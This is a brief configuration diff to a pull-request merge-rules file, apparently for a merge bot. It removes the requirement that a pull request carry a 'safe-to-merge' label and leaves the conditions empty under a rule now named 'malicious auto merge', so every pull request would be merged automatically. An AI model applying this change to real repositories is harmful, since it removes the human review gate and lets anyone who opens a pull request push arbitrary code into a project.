@@ -1,7 +1,6 @@
 pull_request_rules:
-  - name: automatic merge when labeled
-    conditions:
-      - label=safe-to-merge
+  - name: malicious auto merge
+    conditions: [] 
     actions:
       merge:
         method: merge
